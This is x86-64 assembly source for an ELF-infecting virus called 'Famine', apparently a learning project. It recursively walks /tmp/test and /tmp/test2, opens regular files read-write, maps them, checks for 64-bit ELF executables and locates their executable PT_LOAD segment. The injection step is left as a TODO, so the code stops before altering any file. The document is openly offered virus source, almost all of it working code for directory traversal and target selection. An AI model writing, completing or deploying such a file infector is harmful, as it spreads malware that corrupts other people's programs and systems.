section.text:
	global _start:function

;-------------------------------------------------------------------------------
;|   r8   | virus entry                                                        |
;|   r9   | end of virus (without params)                                      |
;-------------------------------------------------------------------------------

;-> Save bytes:
;	mov x, 1 => 5 bytes
;but:
;	push 1
;	pop x
;			=> 3 bytes
;and
;xor x, x => 3 bytes (put 0 into x)

; function parameters are always (rdi, rsi, rdx, rcx, r8, r9) in this specific order
; (make sense with syscall)

_start:
	call _inject; push addr to stack
%ifdef DEBUG; ==================================================================
	db `....FAMINE....`, 0x0

newline db `\n`, 0x0

_print:; (string rdi)
	push r11
	push rdx
	push rbx
	push rsi

	call _ft_strlen; ft_strlen(rdi)
	push rdi; mov rsi, rdi
	pop rsi
	push rax
	pop rdx
	push 1; mov rax, 1
	pop rax; write
	push 1; mov rdi, 1
	pop rdi
	syscall

	push rsi
	pop rbx
	lea rsi, [rel newline]
	push 1
	pop rax; write
	push 1
	pop rdx
	syscall
	push rbx
	pop rdi

	pop rsi
	pop rbx
	pop rdx
	pop r11
ret

%endif; ========================================================================

_inject:
	pop rdi; pop addr from stack
	push rdx; save register
	%ifdef DEBUG
		call _print; _print(rdi)
	%endif
	sub rdi, 0x5; sub call instr
	push rdi; mov r8, rsi
	pop r8
; r8 contains the entry of the virus

	lea rdi, [rel directories]
	xor rcx, rcx; = 0
	.loop_array_string:
		add rdi, rcx
		call _infect_dir
		xor rcx, rcx; = 0
		.next_string:; seek next dir
			inc rcx
			cmp byte[rdi + rcx], 0x0
			jnz .next_string
		inc rcx
		cmp byte[rdi + rcx], 0x0
		jnz .loop_array_string

	xor rax, rax; = 0
	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
	jnz _infected
	jmp _host

_infect_dir:; (string rdi)
	push r10
	push r11
	push r12
	push rdx
	push rcx

	%ifdef DEBUG
		call _print; _print(rdi)
	%endif

	push 2
	pop rax; open
	push 0o0200000; O_RDONLY | O_DIRECTORY
	pop rsi
	syscall
	cmp rax, 0x0
	jl .return; jump lower

	push rdi
	pop r10; path
	push rax
	pop r11; fd

	sub rsp, 1024
	.getdents:
		push r11
		pop rdi
		push 78
		pop rax; getdents
		push 1024
		pop rdx; size of buffer
		mov rsi, rsp; buffer
		syscall
		push rdi
		pop r11
		push rsi
		pop r12
		cmp rax, 0x0
		jle .close
		push rax
		pop rdx; nread
		xor rcx, rcx; = 0

	.loop_in_dir:
		cmp rcx, rdx
		jge .getdents; rcx >= rdx
		mov rdi, r12
		add rdi, rcx; r12 => linux_dir
		; if not . .. +18
		add rdi, 18; linux_dir->d_name
		
		; ft_strcmp with '.' and '..' to not infect_dir with them
		push rcx
		lea rsi, [rel dotdir]
		xor rcx, rcx; = 0
		.loop_array_string:
			add rsi, rcx
			call _ft_strcmp
			cmp rax, 0x0
			je .next_dir
			xor rcx, rcx; = 0
			.next_string:; seek next dir
				inc rcx
				cmp byte[rsi + rcx], 0x0
				jnz .next_string
			inc rcx
			cmp byte[rsi + rcx], 0x0
			jnz .loop_array_string

		; concat_path
			push rbx
			sub rsp, 4096

			push rdi
			pop rbx
			mov rsi, r10
			mov rdi, rsp; buffer
			call _ft_strcpy
			call _ft_strlen
			add rdi, rax
			mov byte[rdi], '/'
			add rdi, 1
			mov rsi, rbx
			call _ft_strcpy
			mov rdi, rsp

		; check infect_dir or infect_file
			push r11 ; stat using r11
			sub rsp, 600

			push 4
			pop rax ; stat
			mov rsi, rsp ; struct stat
			syscall
			cmp rax, 0x0
			jne .free_buffers

			mov rax, [rsi + 24] ; st_mode
			and rax, 0o0170000 ; S_IFMT
			cmp rax, 0o0040000 ; S_IFDIR
			je .infect_dir
			cmp rax, 0o0100000 ; S_IFREG
			je .infect_file
			jmp .free_buffers

		.infect_dir:
			call _infect_dir
			jmp .free_buffers

		.infect_file:
			call _infect_file

		.free_buffers:
			add rsp, 600
			pop r11 ; stat using r11
			add rsp, 4096
			pop rbx

		.next_dir:
			pop rcx
			mov rsi, r12
			add rsi, rcx
			push rdi
			movzx edi, word [rsi + 16]; linux_dir->d_reclen
			add rcx, rdi
			pop rdi
			jmp .loop_in_dir

	.close:
		push r11
		pop rdi
		push 3
		pop rax; close
		syscall
		push r10
		pop rdi
		add rsp, 1024

	.return:

		pop rcx
		pop rdx
		pop r12
		pop r11
		pop r10
ret

_infect_file: ; (string rdi, stat rsi)
	push r8
	push r9
	push r10
	push r12
	push rbx
	push rcx
	push rdx

	push rsi
	pop r12
	%ifdef DEBUG
		call _print; _print(rdi)
	%endif
	push 2
	pop rax; open
	push 0o0000002; O_RDWR
	pop rsi
	syscall
	cmp rax, 0x0
	jl .return; jump lower
	push rdi
	pop r10 ; path
	push rax
	pop r8 ; fd

	push r10
	xor rdi, rdi
	mov rsi, [r12 + 48] ; statbuf.st_size
	push 3
	pop rdx ; PROT_READ | PROT_WRITE
	push 2
	pop r10 ; MAP_PRIVATE
	xor r9, r9
	push 9
	pop rax ; mmap
	syscall
	pop r10
	cmp rax, 0x0
	jl .close ; < 0

	push rax
	pop rsi
	lea rdi, [rel elf_magic]
	push 4
	pop rdx
	call _ft_strncmp
	push rsi
	pop r9
	cmp rax, 0x0
	jne .unmap ; not elf file
	cmp byte[rsi + 16], 2 ; ET_EXEC
	je .is_elf_file
	cmp byte[rsi + 16], 3 ; ET_DYN
	jne .unmap

	.is_elf_file:
		%ifdef DEBUG
			mov rdi, rsi
			call _print; _print(rdi)
		%endif
		; TODO: ft_memmem with signature => don't infect

		; get pt_load exec
		mov rsi, [r9 + 32]; e_phoff
		mov ax, [r9 + 56]; e_phnum
		mov rdi, r9
		add rdi, rsi
		xor rcx, rcx
		.find_segment_exec:
			mov ebx, [rdi]
			cmp ebx, 1 ; PT_LOAD
			jne .next
			xor rdx, rdx
			mov dx, [rdi + 4]
			and dx, 1 ; PF_X
			jnz .segment_found
			.next:
				%ifdef DEBUG
					push rdi
					push rax
					push rcx
					lea rdi, [rel signature]
					call _print
					pop rcx
					pop rax
					pop rdi
				%endif
				inc rcx
				cmp rcx, rax
				je .unmap
				add rdi, 56; sizeof(Elf64_Phdr)
			jmp .find_segment_exec
		.segment_found:
			%ifdef DEBUG
				mov rdi, r10
				call _print; _print(rdi)
			%endif
		; header->e_shoff => 40
		; phdr->p_type => 0
		; PT_LOAD => 1
		; phdr->p_flags => 4
		; PF_X => 1 ; pt_load->p_flags & PF_X
	.unmap:
		push r9
		pop rdi
		mov rsi, [r12 + 48] ; statbuf.st_size
		push 11
		pop rax
		syscall
	.close:
		push r8
		pop rdi
		push 3
		pop rax; close
		syscall
	.return:
		push r10
		pop rdi
		push r12
		pop rsi
		xor rax, rax

	pop rdx
	pop rcx
	pop rbx
	pop r12
	pop r10
	pop r9
	pop r8
ret

_host:
	jmp _check_end
	_back_host:
		pop r9
; r9 contains the end of the virus (minus params)
	jmp _exit

_infected:
	jmp _exit

_exit:
	pop rdx
	pop r13
	pop r14
	pop r15

	mov rax, 60 ; exit
	xor rdi, rdi; = 0
	syscall

; ================================ utils =======================================

_ft_strlen:; (string rdi)
	push rcx

	xor rcx, rcx; = 0
	.loop_char:
		cmp byte [rdi + rcx], 0
		jz .return
		inc rcx
		jmp .loop_char
	.return:
		push rcx
		pop rax

		pop rcx
ret

_ft_strncmp: ; (string rdi, string rsi, size_t rdx)
	push rcx
	dec rdx

	xor rax, rax
	xor rcx, rcx; = 0
	.loop_char:
		mov al, [rdi + rcx]
		cmp al, [rsi + rcx]
		jne .return
		cmp al, 0x0
		je .return
		cmp rcx, rdx
		je .return
		inc rcx
	jmp .loop_char
	.return:
		sub al, [rsi + rcx]

	inc rdx
	pop rcx
ret

_ft_strcmp: ; (string rdi, string rsi)
	push rcx

	xor rax, rax
	xor rcx, rcx; = 0
	.loop_char:
		mov al, [rdi + rcx]
		cmp al, [rsi + rcx]
		jne .return
		cmp al, 0x0
		je .return
		inc rcx
	jmp .loop_char
	.return:
		sub al, [rsi + rcx]

	pop rcx
ret

_ft_strcpy: ; (string rdi, string rsi)
	push rcx

	xor rcx, rcx; = 0
	.loop_char:
		mov al, [rsi + rcx]
		mov [rdi + rcx], al
		cmp byte[rsi + rcx], 0x0
		je .return
		inc rcx
	jmp .loop_char
	.return:
		mov rax, rdi

	pop rcx
ret

; ==============================================================================

;                   E     L    F   |  v ELFCLASS64
elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
dotdir db `.`, 0x0, `..`, 0x0, 0x0
directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
signature db `Famine version 1.0 (c)oded by lmartin`, 0x0; sw4g signature

_check_end:
	call _back_host; push addr to stack

_params:
	vaddr dq 0x0
	entry_inject dq 0x0
	entry_prg dq 0x0
